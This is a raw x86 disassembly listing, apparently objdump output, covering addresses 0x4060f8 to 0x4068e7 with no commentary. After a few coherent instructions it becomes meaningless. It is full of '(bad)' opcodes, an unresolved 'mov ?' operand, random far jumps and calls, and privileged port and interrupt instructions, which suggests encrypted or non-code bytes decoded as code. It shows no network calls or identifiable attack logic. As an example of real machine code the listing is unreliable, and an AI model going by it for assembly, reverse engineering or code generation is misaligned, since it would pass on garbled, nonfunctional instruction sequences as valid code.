  4060f8:	mov    BYTE PTR [ebp-0x1],dl
  4060fb:	mov    al,BYTE PTR [ebp-0x1]
  4060fe:	mov    edx,DWORD PTR [ebp-0x30]
  406101:	mov    ebx,DWORD PTR [ebp-0xc]
  406104:	xor    edx,esi
  406106:	add    edx,edi
  406108:	imul   edx,ebx
  40610b:	jmp    0x408462
  406110:	add    eax,edx
  406112:	test   BYTE PTR [esi+edx*2],al
  406115:	pop    eax
  406116:	add    edx,ebx
  406118:	push   edx
  406119:	popf   
  40611a:	and    dl,bh
  40611c:	sub    ch,BYTE PTR [eax-0x3e10c3a3]
  406122:	jnp    0x40619f
  406124:	mov    ch,0x9e
  406126:	jnp    0x4061a3
  406128:	add    eax,0x1f80ff63
  40612d:	lods   al,BYTE PTR ds:[esi]
  40612e:	and    eax,0xec28b943
  406133:	mov    ah,0x19
  406135:	inc    ecx
  406136:	mov    esp,ebx
  406138:	sub    DWORD PTR [edi-0x353e8c55],ebx
  40613e:	iret   
  40613f:	push   0x32
  406141:	pop    edx
  406142:	lds    eax,FWORD PTR ds:0x4b31c4a2
  406148:	xor    esi,DWORD PTR [edx-0x52]
  40614b:	dec    esp
  40614c:	cmp    al,0xec
  40614e:	enter  0x1936,0x20
  406152:	adc    dh,dh
  406154:	pop    ebx
  406155:	mov    edx,0xeaf6b51e
  40615a:	jmp    0x3a16:0x86447f8f
  406161:	fucomi st,st(7)
  406163:	pop    edi
  406164:	daa    
  406165:	pushf  
  406166:	mov    al,BYTE PTR [esi]
  406168:	leave  
  406169:	mov    ds:0x9e5a5088,eax
  40616e:	mov    ds:0x88ee9160,al
  406173:	adc    eax,0xe3a69043
  406178:	in     al,0xd
  40617a:	enter  0x4784,0x9b
  40617e:	jle    0x406128
  406180:	xchg   DWORD PTR [edx+edi*4-0x30],edx
  406184:	mov    edx,0xc2df7aa6
  406189:	cs pop edx
  40618b:	and    DWORD PTR [edx-0x5ec3a989],0x3d
  406192:	jmp    0xa952bde6
  406197:	sbb    eax,DWORD PTR [eax+0x63]
  40619a:	das    
  40619b:	mov    esp,0x95d2ae3d
  4061a0:	pop    ebp
  4061a1:	xchg   esi,eax
  4061a2:	scas   eax,DWORD PTR es:[edi]
  4061a3:	fcom   st(7)
  4061a5:	and    ah,ah
  4061a7:	pop    eax
  4061a8:	pop    esp
  4061a9:	jmp    0xeefcae76
  4061ae:	sahf   
  4061af:	arpl   WORD PTR [ebx],dx
  4061b1:	jl     0x4061eb
  4061b3:	mov    ebp,0xdc7647f5
  4061b8:	xchg   BYTE PTR [edi-0x62d94a7f],cl
  4061be:	mov    cl,0xaf
  4061c0:	je     0x40622a
  4061c2:	ins    BYTE PTR es:[edi],dx
  4061c3:	rcr    BYTE PTR [edx-0x74665925],1
  4061c9:	imul   esp,DWORD PTR [ecx+0x61],0x15
  4061cd:	es jno 0x4061bd
  4061d0:	jb     0x4061bc
  4061d2:	pushf  
  4061d3:	xchg   ebp,eax
  4061d4:	xor    bh,ah
  4061d6:	cdq    
  4061d7:	sbb    BYTE PTR [edi+esi*1-0x6a311831],0xf6
  4061df:	sbb    al,0x81
  4061e1:	mov    eax,ds:0x728f128c
  4061e6:	sub    BYTE PTR ds:0xd84fe622,dh
  4061ec:	popa   
  4061ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061ee:	jge    0x406197
  4061f0:	or     dh,BYTE PTR [ecx-0x2c]
  4061f3:	in     al,dx
  4061f4:	xchg   BYTE PTR [ecx-0x6e],dh
  4061f7:	mov    eax,0xf53633fa
  4061fc:	int    0x39
  4061fe:	leave  
  4061ff:	mov    ch,0x90
  406201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406202:	cld    
  406203:	sub    BYTE PTR [edx-0x33],al
  406206:	test   al,0x6d
  406208:	popf   
  406209:	xchg   esi,eax
  40620a:	(bad)
  40620d:	adc    DWORD PTR [ecx+eax*4],edx
  406210:	loope  0x4061ff
  406212:	push   0x65
  406214:	xchg   cl,bl
  406216:	cmp    edi,DWORD PTR [ebx+0x5ad528f3]
  40621c:	aaa    
  40621d:	ins    DWORD PTR es:[edi],dx
  40621e:	inc    ebp
  40621f:	mov    eax,ds:0x804800a
  406224:	jbe    0x406236
  406226:	and    eax,0xea471e74
  40622b:	pop    ds
  40622c:	cmp    DWORD PTR [ebx-0x157ad29c],esp
  406232:	stc    
  406233:	xor    bh,BYTE PTR [esi+ecx*2]
  406236:	fs loope 0x4061e8
  406239:	mov    ds:0x69c8d6a,eax
  40623e:	stos   DWORD PTR es:[edi],eax
  40623f:	in     al,0x7e
  406241:	idiv   BYTE PTR [ecx-0x2c22c20a]
  406247:	fdivr  QWORD PTR [edi]
  406249:	mov    ah,0xba
  40624b:	xchg   DWORD PTR [ecx+0x3e473450],edx
  406251:	bound  edi,QWORD PTR [eax]
  406253:	mov    edi,DWORD PTR [ecx]
  406255:	xchg   esp,eax
  406256:	xor    ebx,DWORD PTR [eax-0x614c8a1a]
  40625c:	stos   BYTE PTR es:[edi],al
  40625d:	cdq    
  40625e:	mov    ds:0xc75ea8b5,al
  406263:	stos   BYTE PTR es:[edi],al
  406264:	jg     0x4062ce
  406266:	jnp    0x406267
  406268:	fsub   DWORD PTR [ebx+edx*1+0x3bef206b]
  40626f:	jp     0x40627e
  406271:	add    al,0xf0
  406273:	mov    dh,0x17
  406275:	mov    edx,0xc5e4cd3c
  40627a:	xor    al,0x9a
  40627c:	out    0x95,al
  40627e:	cwde   
  40627f:	mov    eax,0x9faaa555
  406284:	stos   BYTE PTR es:[edi],al
  406285:	lea    eax,[ecx+0x48]
  406288:	jne    0x4062a2
  40628a:	inc    edx
  40628b:	(bad)  [ebp-0x4]
  40628e:	jge    0x4062b2
  406290:	out    dx,eax
  406291:	fcomp  QWORD PTR gs:[ecx-0x4833e500]
  406298:	adc    BYTE PTR [ecx-0x2c],cl
  40629b:	mov    edi,edi
  40629d:	push   0x2d
  40629f:	jp     0x406316
  4062a1:	popf   
  4062a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062a3:	rol    BYTE PTR [edx],cl
  4062a5:	inc    esp
  4062a6:	(bad)  
  4062a7:	iret   
  4062a8:	cmp    al,dl
  4062aa:	lods   al,BYTE PTR ds:[esi]
  4062ab:	retf   0x9628
  4062ae:	cmp    dl,ah
  4062b0:	(bad)
  4062b4:	and    DWORD PTR [eax+0x22],0x887cfb4f
  4062bb:	add    ch,bl
  4062bd:	cmp    DWORD PTR [ebx+0x179c01fa],edi
  4062c3:	cwde   
  4062c4:	and    al,0xaa
  4062c6:	sub    cl,BYTE PTR [esi-0xe]
  4062c9:	addr16 popf 
  4062cb:	loop   0x406333
  4062cd:	(bad)  
  4062ce:	xlat   BYTE PTR ds:[ebx]
  4062cf:	repnz push eax
  4062d1:	add    bh,BYTE PTR [eax+eiz*8+0x38317b21]
  4062d8:	outs   dx,BYTE PTR ds:[esi]
  4062d9:	ins    DWORD PTR es:[edi],dx
  4062da:	shr    DWORD PTR [esi+0x77],cl
  4062dd:	xchg   ebp,eax
  4062de:	sub    al,0xc2
  4062e0:	or     al,0x78
  4062e2:	jle    0x4062f3
  4062e4:	jne    0x40631b
  4062e6:	jge    0x40627f
  4062e8:	leave  
  4062e9:	popa   
  4062ea:	in     al,dx
  4062eb:	xchg   esp,eax
  4062ec:	cmp    eax,0x977ba567
  4062f1:	retf   
  4062f2:	and    ecx,DWORD PTR [eax-0x34]
  4062f5:	sub    dh,BYTE PTR [edi]
  4062f7:	loopne 0x4062cc
  4062f9:	call   0x55db:0x465e7a4e
  406300:	cmp    al,ah
  406302:	xchg   esp,eax
  406303:	fmul   st,st(7)
  406305:	dec    eax
  406306:	jmp    0xd43bfa0f
  40630b:	scas   al,BYTE PTR es:[edi]
  40630c:	sub    ecx,DWORD PTR [ecx]
  40630e:	mov    edx,0x2882c5e4
  406313:	loop   0x406303
  406315:	jnp    0x406394
  406317:	call   0x6cf7:0x80a64235
  40631e:	mov    ah,0xaa
  406320:	cmc    
  406321:	mov    ds:0x5df8a5d0,ax
  406327:	pop    ebx
  406328:	fst    QWORD PTR [edi]
  40632a:	cmp    esi,eax
  40632c:	mov    ebp,0x40a9f53a
  406331:	aad    0x8e
  406333:	or     BYTE PTR [eax],ah
  406335:	and    eax,0x9592d2e5
  40633a:	pop    esp
  40633b:	pop    esp
  40633c:	xor    dh,BYTE PTR [ecx]
  40633e:	xor    eax,0xf3d4348f
  406343:	sbb    BYTE PTR [eax],0xcf
  406346:	add    bl,0x3
  406349:	cdq    
  40634a:	mov    dl,0x6d
  40634c:	sbb    ah,cl
  40634e:	xadd   BYTE PTR [ecx+0x60],dh
  406352:	sub    BYTE PTR [edx],bl
  406354:	rol    DWORD PTR [edx-0xb],cl
  406357:	dec    ecx
  406358:	outs   dx,BYTE PTR ds:[esi]
  406359:	call   FWORD PTR [edi]
  40635b:	mov    ch,0xd2
  40635d:	mov    ebx,0xc8821ea2
  406362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406363:	jecxz  0x406377
  406365:	pushf  
  406366:	idiv   BYTE PTR [edx+eiz*1-0x19]
  40636a:	loop   0x4063b8
  40636c:	mov    eax,ds:0x98206e3a
  406371:	inc    ebp
  406372:	mov    dh,al
  406374:	jmp    DWORD PTR [esi]
  406376:	fnstcw WORD PTR [ecx-0x29]
  406379:	pop    ecx
  40637a:	push   esp
  40637b:	jp     0x40639b
  40637d:	push   ecx
  40637e:	inc    eax
  40637f:	ret    0xcfbe
  406382:	inc    esi
  406383:	mov    ds:0xcfd7efed,eax
  406388:	jnp    0x40637d
  40638a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40638b:	loope  0x40636a
  40638d:	mov    ds:0xd88b621a,al
  406392:	bound  esp,QWORD PTR [ebx-0x1d]
  406395:	fnstcw WORD PTR [esi-0x2a]
  406398:	mov    edx,0x10d9855c
  40639d:	adc    DWORD PTR [ebx+0x378e9ead],ebx
  4063a3:	and    BYTE PTR [ebx],0x78
  4063a6:	inc    edi
  4063a7:	sbb    bl,BYTE PTR [esi+0x1b]
  4063aa:	adc    ecx,ebx
  4063ac:	fstp   st(7)
  4063ae:	into   
  4063af:	jmp    0x40ee:0xca357ac8
  4063b6:	scas   al,BYTE PTR es:[edi]
  4063b7:	and    dh,al
  4063b9:	inc    esi
  4063ba:	or     edx,ecx
  4063bc:	stc    
  4063bd:	sub    al,0xb7
  4063bf:	mov    eax,ds:0x2607950f
  4063c4:	adc    eax,DWORD PTR [ebx-0x1f]
  4063c7:	jle    0x40638a
  4063c9:	(bad)  
  4063ca:	fsubr  DWORD PTR [ebx-0x9]
  4063cd:	lahf   
  4063ce:	mov    ebx,0x5f5e8a92
  4063d3:	sub    DWORD PTR ds:0x4e2d7b8c,eax
  4063d9:	pop    ecx
  4063da:	sub    eax,0xc51e1cee
  4063df:	jecxz  0x406456
  4063e1:	jns    0x4063f9
  4063e3:	mov    eax,DWORD PTR [edx+0x6b57baa4]
  4063e9:	or     dh,dh
  4063eb:	cld    
  4063ec:	addr16 (bad) 
  4063ee:	loopne 0x406390
  4063f0:	stc    
  4063f1:	push   edx
  4063f2:	(bad)  
  4063f3:	sbb    al,BYTE PTR [edx-0x75b2d804]
  4063f9:	cli    
  4063fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063fb:	adc    al,0x37
  4063fd:	and    al,0x4e
  4063ff:	jmp    0xf78b:0x861d23f7
  406406:	sahf   
  406407:	pushf  
  406408:	sub    cl,cl
  40640a:	push   es
  40640b:	daa    
  40640c:	dec    eax
  40640d:	fcomp  QWORD PTR [ebp+0x39]
  406410:	or     ebx,ebp
  406412:	xor    BYTE PTR [ebx+0x4ec46241],dh
  406418:	in     al,dx
  406419:	xcrypt-ctr (bad)
  40641a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40641b:	sbb    DWORD PTR [eax-0x19c75f1d],ebx
  406421:	cmp    edx,edx
  406423:	xchg   edx,eax
  406424:	(bad)  
  406425:	mov    ds:0xe7a7253d,eax
  40642a:	in     al,dx
  40642b:	das    
  40642c:	ins    BYTE PTR es:[edi],dx
  40642d:	xchg   edi,eax
  40642e:	or     DWORD PTR [ebx],0xf7800f7d
  406434:	call   0xac992716
  406439:	mov    ah,0x22
  40643b:	inc    ebp
  40643c:	shl    DWORD PTR [edi-0x50],1
  40643f:	pop    ds
  406440:	and    eax,0x929f2722
  406445:	stc    
  406446:	test   DWORD PTR [esi+esi*8-0x161623e4],ecx
  40644d:	lahf   
  40644e:	xor    DWORD PTR [edi+ecx*1-0x56],esp
  406452:	nop
  406453:	test   DWORD PTR [edi],0xc606ff2a
  406459:	mov    dl,0xfb
  40645b:	sbb    BYTE PTR [eax],ah
  40645d:	(bad)  
  40645e:	in     eax,0xd3
  406460:	or     BYTE PTR [edx],bl
  406462:	fdivr  QWORD PTR [edx+eiz*8+0x723227d5]
  406469:	mov    fs,WORD PTR [esi-0x7fadcd2]
  40646f:	jmp    0x406462
  406471:	mov    si,0x4c70
  406475:	xor    BYTE PTR [edx],0x65
  406478:	gs ins BYTE PTR es:[edi],dx
  40647a:	into   
  40647b:	js     0x40642d
  40647d:	pop    ebp
  40647e:	jo     0x4064fb
  406480:	mov    cl,0x2
  406482:	mov    ds:0x5b2bcdfd,al
  406487:	xchg   esi,eax
  406488:	vpmulhuw ymm5,ymm5,YMMWORD PTR [edi]
  40648c:	dec    ebx
  40648d:	ins    BYTE PTR es:[edi],dx
  40648e:	daa    
  40648f:	cdq    
  406490:	adc    BYTE PTR [ebp+ebx*1+0x504b99a6],0x29
  406498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406499:	in     eax,0x26
  40649b:	popa   
  40649c:	jb     0x40647b
  40649e:	pop    es
  40649f:	mov    bh,0x50
  4064a1:	mov    ?,esp
  4064a3:	push   ebp
  4064a4:	push   ebx
  4064a5:	jle    0x406523
  4064a7:	pusha  
  4064a8:	jbe    0x406505
  4064aa:	rcl    bl,cl
  4064ac:	mov    dh,0x2c
  4064ae:	xchg   edi,eax
  4064af:	gs ds loop 0x4064ce
  4064b3:	pop    ecx
  4064b4:	pop    esi
  4064b5:	mov    ch,0x85
  4064b7:	sahf   
  4064b8:	js     0x4064da
  4064ba:	dec    edi
  4064bb:	xor    BYTE PTR [edi+0x7542c70c],0x10
  4064c2:	fdivrp st(5),st
  4064c4:	sbb    eax,0xf19f96a3
  4064c9:	into   
  4064ca:	mov    ds:0xcf2a3719,al
  4064cf:	cmc    
  4064d0:	(bad)  ds:0x9444847d
  4064d6:	dec    ebp
  4064d7:	push   ecx
  4064d8:	lock (bad) 
  4064da:	shr    DWORD PTR [edi+0x10cf5d39],cl
  4064e0:	push   0x13
  4064e2:	fs push ecx
  4064e4:	xchg   ebx,eax
  4064e5:	jl     0x406477
  4064e7:	push   eax
  4064e8:	ja     0x406549
  4064ea:	xor    esi,ecx
  4064ec:	call   0x4fe42412
  4064f1:	pop    edi
  4064f2:	addr16 sbb eax,eax
  4064f5:	sbb    ecx,esp
  4064f7:	sbb    eax,0xa40ec49f
  4064fc:	ins    DWORD PTR es:[edi],dx
  4064fd:	mov    ebx,0x32f23134
  406502:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406503:	dec    ebp
  406504:	shr    BYTE PTR [edi-0x8f04152],cl
  40650a:	cmp    bl,BYTE PTR [ecx-0x3aaa8895]
  406510:	data16 loope 0x4064cd
  406513:	xor    eax,DWORD PTR [edx]
  406515:	nop
  406516:	inc    esi
  406517:	inc    ecx
  406518:	adc    DWORD PTR [ecx-0x495d9fd1],0x2
  40651f:	aaa    
  406520:	das    
  406521:	das    
  406522:	push   es
  406523:	sub    DWORD PTR [eax-0x16],ebp
  406526:	push   esi
  406527:	mov    ah,0x3a
  406529:	xor    BYTE PTR [ebx],dl
  40652b:	(bad)  
  40652c:	mov    ds:0x4a5d91cb,al
  406531:	ja     0x40652d
  406533:	xchg   esi,eax
  406534:	mov    ch,0x48
  406536:	out    0x90,eax
  406538:	int3   
  406539:	std    
  40653a:	cmc    
  40653b:	aaa    
  40653c:	xchg   ebx,eax
  40653d:	push   0x18798210
  406542:	adc    eax,0xc0bcb541
  406547:	iret   
  406548:	dec    edi
  406549:	sbb    edi,eax
  40654b:	inc    ecx
  40654c:	movhlps xmm0,xmm5
  40654f:	mov    al,ds:0xeb0d3a71
  406554:	loope  0x4065cf
  406556:	xchg   ebx,eax
  406557:	loopne 0x4065ce
  406559:	(bad)  
  40655a:	aaa    
  40655b:	cmp    eax,0x6178d367
  406560:	push   ds
  406561:	cmp    DWORD PTR [edi],esp
  406563:	lahf   
  406564:	mov    cl,0xda
  406566:	xchg   edx,eax
  406567:	mov    al,ds:0x52e71e9f
  40656c:	stos   DWORD PTR es:[edi],eax
  40656d:	xchg   edi,eax
  40656e:	inc    edx
  40656f:	sbb    esp,ecx
  406571:	push   ebx
  406572:	aaa    
  406573:	into   
  406574:	push   esi
  406575:	cli    
  406576:	rcr    BYTE PTR [ebp+0x71f75c07],1
  40657c:	sbb    eax,0x51cd49e2
  406581:	xchg   edx,eax
  406582:	repnz cmp al,0x18
  406585:	fadd   QWORD PTR [esi]
  406587:	sub    DWORD PTR [edi+0x45009096],0x45
  40658e:	pop    eax
  40658f:	popa   
  406590:	scas   al,BYTE PTR es:[edi]
  406591:	jnp    0x406612
  406593:	cmp    BYTE PTR [ebx-0x6c710ff0],cl
  406599:	inc    esi
  40659a:	add    al,BYTE PTR [ebx+edi*8+0x73ade43f]
  4065a1:	sbb    ah,BYTE PTR [edx+ebp*4+0x2c]
  4065a5:	mov    eax,ds:0xff6a841b
  4065aa:	mov    ah,0xe0
  4065ac:	jl     0x40656b
  4065ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065af:	mov    ecx,0x56fe3be1
  4065b4:	(bad)
  4065b7:	mov    bh,ah
  4065b9:	push   edx
  4065ba:	retf   
  4065bb:	dec    esi
  4065bc:	mov    ebp,edx
  4065be:	or     al,0xa8
  4065c0:	sub    BYTE PTR [ecx+0x1e0eac0],0xa0
  4065c7:	dec    ecx
  4065c8:	cmp    ah,dh
  4065ca:	lds    esi,FWORD PTR [ecx+0x5187d053]
  4065d0:	stc    
  4065d1:	mov    bh,0x1c
  4065d3:	sar    BYTE PTR [ebx-0x4f],0xa4
  4065d7:	out    dx,eax
  4065d8:	mov    al,BYTE PTR [edi]
  4065da:	ret    0x662d
  4065dd:	(bad)  
  4065de:	and    eax,0x7cdff2a3
  4065e3:	ffree  st(7)
  4065e5:	adc    cl,BYTE PTR [esi-0x1a2ad7e0]
  4065eb:	fdivr  QWORD PTR [ebp+0x5759a305]
  4065f1:	sub    al,0x1b
  4065f3:	mov    edi,DWORD PTR [eax+esi*2-0x11fd0594]
  4065fa:	out    dx,eax
  4065fb:	xor    al,0xdb
  4065fd:	or     al,0x64
  4065ff:	lods   eax,DWORD PTR ds:[esi]
  406600:	or     al,0xe7
  406602:	out    dx,eax
  406603:	aaa    
  406604:	dec    edx
  406605:	iret   
  406606:	xor    ch,BYTE PTR [esi+0xd]
  406609:	out    dx,eax
  40660a:	mov    bh,0x61
  40660c:	in     eax,dx
  40660d:	ret    
  40660e:	add    BYTE PTR [edx+0x4e],al
  406611:	pusha  
  406612:	jmp    FWORD PTR [ecx]
  406614:	call   0x1a04:0xeab6adef
  40661b:	cli    
  40661c:	das    
  40661d:	inc    esi
  40661e:	mov    cs:0x36bf5621,eax
  406624:	add    al,0xa4
  406626:	out    0xa3,eax
  406628:	push   esp
  406629:	jno    0x4065f0
  40662b:	or     ecx,DWORD PTR [ecx+0x5d]
  40662e:	or     esi,esp
  406630:	out    0x58,eax
  406632:	adc    DWORD PTR [eax-0x67],ebx
  406635:	jmp    0x94d5c09d
  40663a:	mov    al,ds:0xc00d4c1b
  40663f:	std    
  406640:	jecxz  0x4065d3
  406642:	jnp    0x406672
  406644:	std    
  406645:	cmp    esp,0x9bfb2d3b
  40664b:	inc    edx
  40664c:	push   ds
  40664d:	rcl    ch,cl
  40664f:	div    DWORD PTR [ebx+0x66672353]
  406655:	(bad)  
  406656:	jbe    0x40667c
  406658:	popa   
  406659:	(bad)  [esp+edx*8]
  40665c:	outs   dx,DWORD PTR ds:[esi]
  40665d:	sar    BYTE PTR [eax-0x54],1
  406660:	leave  
  406661:	cmc    
  406662:	sub    dh,BYTE PTR [ebx-0x1d515d76]
  406668:	outs   dx,DWORD PTR ds:[esi]
  406669:	add    dh,ah
  40666b:	dec    ebp
  40666c:	xchg   edx,eax
  40666d:	jb     0x406605
  40666f:	pop    ds
  406670:	in     al,0x8f
  406672:	inc    ebp
  406673:	mov    bh,dl
  406675:	sbb    eax,0xa9e84a9b
  40667a:	push   cs
  40667b:	ins    BYTE PTR es:[edi],dx
  40667c:	jnp    0x40669f
  40667e:	rcl    bl,1
  406680:	das    
  406681:	xchg   ecx,eax
  406682:	or     ah,BYTE PTR [ebp-0x9b9835a]
  406688:	push   0xab3806d9
  40668d:	sub    dl,al
  40668f:	scas   al,BYTE PTR es:[edi]
  406690:	push   ecx
  406691:	clc    
  406692:	pop    es
  406693:	mov    ebx,0x78ffe975
  406698:	adc    al,0x2d
  40669a:	std    
  40669b:	arpl   WORD PTR [edx],bx
  40669d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40669e:	pop    edi
  40669f:	mov    bh,0x85
  4066a1:	(bad)  [edx+0x3d911b6c]
  4066a7:	inc    esp
  4066a8:	fisttp DWORD PTR [ebx+0x42cadfd1]
  4066ae:	retf   0x1741
  4066b1:	sbb    BYTE PTR [ecx+0x71],dl
  4066b4:	jge    0x40670f
  4066b6:	dec    ecx
  4066b7:	jo     0x406655
  4066b9:	scas   eax,DWORD PTR es:[edi]
  4066ba:	sub    DWORD PTR [edx+0x79],ebx
  4066bd:	hlt    
  4066be:	mul    DWORD PTR [edi-0x3b96db05]
  4066c4:	fistp  DWORD PTR [edi-0x1f300772]
  4066ca:	add    ah,BYTE PTR [edi-0x673c250f]
  4066d0:	inc    eax
  4066d1:	mov    ds:0x82995d42,eax
  4066d6:	sub    dl,0x5f
  4066d9:	pop    ebx
  4066da:	mov    BYTE PTR [esi-0x78],dl
  4066dd:	xchg   edi,eax
  4066de:	mov    cl,0x42
  4066e0:	fsub   DWORD PTR [esi+0x106de276]
  4066e6:	fs int 0x5c
  4066e9:	cdq    
  4066ea:	inc    edi
  4066eb:	and    esi,ecx
  4066ed:	rcr    DWORD PTR [ecx],1
  4066ef:	fmul   DWORD PTR [ecx+0x47ccf09e]
  4066f5:	xchg   ecx,eax
  4066f6:	jbe    0x4066c9
  4066f8:	inc    edi
  4066f9:	mov    esi,0x6f8535d
  4066fe:	les    ebp,FWORD PTR [ecx+0x5e]
  406701:	sub    BYTE PTR [ecx-0x7178c1b5],ah
  406707:	daa    
  406708:	push   0x725a0ff3
  40670d:	push   ecx
  40670e:	dec    ecx
  40670f:	fbstp  TBYTE PTR [edx+0x42]
  406712:	mov    edi,0x71be3871
  406717:	dec    edx
  406718:	(bad)  
  406719:	adc    ebp,DWORD PTR [eax]
  40671b:	out    dx,al
  40671c:	mov    edx,0x5c4bfb24
  406721:	or     DWORD PTR [eax+0x4e],esp
  406724:	jp     0x4066ee
  406726:	xor    esi,DWORD PTR [edx-0x23]
  406729:	test   eax,0x8d24f2dd
  40672e:	jnp    0x40677f
  406730:	lock aas 
  406732:	mov    ?,ecx
  406734:	bound  ebx,QWORD PTR [ebx]
  406736:	lds    esp,FWORD PTR ds:0x40a7068f
  40673c:	jmp    0xedde:0x3ad87f
  406743:	pop    ebx
  406744:	sbb    DWORD PTR [ebp+edi*8-0x18],edi
  406748:	iret   
  406749:	cld    
  40674a:	dec    ecx
  40674b:	aas    
  40674c:	fdiv   DWORD PTR [ebx+esi*2-0x2514dae1]
  406753:	sti    
  406754:	mov    ah,0xcb
  406756:	int3   
  406757:	outs   dx,DWORD PTR ds:[esi]
  406758:	fisttp WORD PTR [ebp-0x677ce700]
  40675e:	je     0x406714
  406760:	neg    BYTE PTR [esp+ecx*8-0x24]
  406764:	cmp    al,0x2e
  406766:	sbb    DWORD PTR [esp-0x7c],esi
  40676a:	(bad)  
  40676b:	in     al,dx
  40676c:	les    ecx,FWORD PTR [edi]
  40676e:	test   DWORD PTR [edx],esi
  406770:	jns    0x406756
  406772:	mov    ebx,0xfaf5b81e
  406777:	popa   
  406778:	iret   
  406779:	jp     0x40670a
  40677b:	(bad)  
  40677d:	int3   
  40677e:	test   BYTE PTR [ecx+ebx*2],ch
  406781:	jle    0x40676f
  406783:	add    ch,BYTE PTR [esi]
  406785:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406786:	test   eax,0x1dee6754
  40678b:	jmp    0x4da00023
  406790:	std    
  406791:	pop    ecx
  406792:	inc    ebp
  406793:	imul   edi,DWORD PTR [esi+0x2cbe726c],0xffffff84
  40679a:	(bad)
  40679e:	pop    ebp
  40679f:	or     al,0xa
  4067a1:	sub    BYTE PTR [edi+0x29f228d7],bh
  4067a7:	jmp    edx
  4067a9:	call   0xa7f2:0xdc36a2a
  4067b0:	scas   al,BYTE PTR es:[edi]
  4067b1:	push   esp
  4067b2:	mov    dh,al
  4067b4:	scas   al,BYTE PTR es:[edi]
  4067b5:	jo     0x406767
  4067b7:	xchg   edi,eax
  4067b8:	stos   BYTE PTR es:[edi],al
  4067b9:	sbb    BYTE PTR [edx+ebx*1-0x35],bh
  4067bd:	add    eax,0x9503d1e
  4067c2:	mov    ebx,DWORD PTR [ebx+eax*8]
  4067c5:	leave  
  4067c6:	stos   DWORD PTR es:[edi],eax
  4067c7:	dec    esi
  4067c8:	or     ah,dl
  4067ca:	out    dx,eax
  4067cb:	or     DWORD PTR [edx+0x5e064d1b],edx
  4067d1:	pop    ds
  4067d2:	xchg   ebp,eax
  4067d3:	pop    edx
  4067d4:	loop   0x406756
  4067d6:	fisub  WORD PTR [edi+0x75]
  4067d9:	in     al,0xb7
  4067db:	fmul   DWORD PTR [edi-0x83d1b01]
  4067e1:	xor    DWORD PTR [ebx-0x54cabe73],esp
  4067e7:	mov    ah,0x15
  4067e9:	cld    
  4067ea:	loopne 0x4067f2
  4067ec:	fimul  WORD PTR [ebp+ebx*4-0x1845898d]
  4067f3:	jae    0x40682f
  4067f5:	ss inc ecx
  4067f7:	cdq    
  4067f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067f9:	dec    ebp
  4067fa:	jbe    0x406871
  4067fc:	cli    
  4067fd:	out    dx,eax
  4067fe:	jae    0x4067e4
  406800:	test   al,0xb1
  406802:	inc    ebp
  406803:	push   0x353a9023
  406808:	sbb    eax,eax
  40680a:	dec    ebx
  40680b:	fdivr  QWORD PTR [eax-0x2]
  40680e:	sub    DWORD PTR [ebp-0x2340364b],esi
  406814:	xchg   ecx,eax
  406815:	data16 std 
  406817:	pop    ebx
  406818:	adc    esi,DWORD PTR [ebx+0x68]
  40681b:	xor    DWORD PTR [esi-0xd],ebx
  40681e:	jae    0x4067fb
  406820:	je     0x406839
  406822:	sub    eax,0x45fe0ce0
  406827:	sbb    DWORD PTR [edi-0x1c8fe5b4],eax
  40682d:	je     0x4067e3
  40682f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406830:	pop    esi
  406831:	mov    eax,0x3272c90f
  406836:	mov    cs:0xa4aec64a,al
  40683c:	call   0x44a6d158
  406841:	cmp    esp,DWORD PTR [esi+0x10fc8b4]
  406847:	pop    ss
  406848:	in     al,0x95
  40684a:	stos   DWORD PTR es:[edi],eax
  40684b:	ret    0x1da8
  40684e:	pop    edi
  40684f:	add    DWORD PTR [eax-0x5a3c27f2],edx
  406855:	sub    ah,ch
  406857:	sub    al,dl
  406859:	mov    DWORD PTR [eax+eax*8],ebp
  40685c:	cdq    
  40685d:	shl    edx,1
  40685f:	mov    al,BYTE PTR [esi-0x4ae92d90]
  406865:	push   ss
  406866:	sahf   
  406867:	addr16 inc ecx
  406869:	sbb    eax,0x2fa47773
  40686e:	cmp    DWORD PTR [ebx+0x43270886],edi
  406874:	retf   
  406875:	shr    BYTE PTR [eax+0x40],cl
  406878:	xchg   DWORD PTR [esp+eiz*8-0x54],ecx
  40687c:	test   al,0xec
  40687e:	jnp    0x406889
  406880:	or     edx,esp
  406882:	in     al,0x2
  406884:	jl     0x406865
  406886:	pop    es
  406887:	push   eax
  406888:	jmp    0x205c:0x1aafe839
  40688f:	or     BYTE PTR [ecx+0x3984cb38],bl
  406895:	imul   eax,DWORD PTR [edx],0x7eeb11f0
  40689b:	xchg   cl,dl
  40689d:	idiv   BYTE PTR [edi]
  40689f:	jmp    0x260:0x6a0a0ea0
  4068a6:	in     eax,dx
  4068a7:	dec    ebp
  4068a8:	daa    
  4068a9:	loope  0x406876
  4068ab:	xchg   edi,eax
  4068ac:	inc    edi
  4068ad:	mov    al,ds:0x79ea66d6
  4068b2:	ds jl  0x4068a8
  4068b5:	xchg   ebx,eax
  4068b6:	xchg   ebp,eax
  4068b7:	mov    ah,0xed
  4068b9:	call   DWORD PTR [esi-0x440c3838]
  4068bf:	sub    BYTE PTR ds:0xa08834b3,dh
  4068c5:	jg     0x4068ab
  4068c7:	call   0xf6d7:0xc8466822
  4068ce:	scas   al,BYTE PTR es:[edi]
  4068cf:	and    esp,0x6a4fcdd3
  4068d5:	imul   ebx,DWORD PTR [eax],0x86d1bb6f
  4068db:	cmp    eax,DWORD PTR [esi-0x73]
  4068de:	xchg   DWORD PTR [edx],ecx
  4068e0:	sub    BYTE PTR [esi+0x3b],0x7c
  4068e4:	or     cl,BYTE PTR [esp+ebx*8]
  4068e7:	xchg   edx,eax
